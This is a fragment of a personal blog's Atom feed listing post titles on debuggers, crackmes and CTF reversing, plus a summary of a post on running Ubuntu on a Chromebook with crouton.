      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/creating-a-barebones-debugger.html&quot;&gt;
          Creating a Barebones Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
          Reversing the buildString CTF challenge
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">I was recently able to get my hands on a Chromebook for free. Normally, ChromeOS (which is one of the most useless OSes created) just allows the user to do very basic tasks, such as browsing the internet or accessing documents, and is more geared towards older and more non-technical users. However, it is possible to unlock other potential uses for ChromeOS, one of which is running Linux on the Chromebook. In this post, I’m going to go ahead and show you exactly how I was able to get Ubuntu up and running in my Chromebook using a nice tool called crouton.</summary></entry></feed>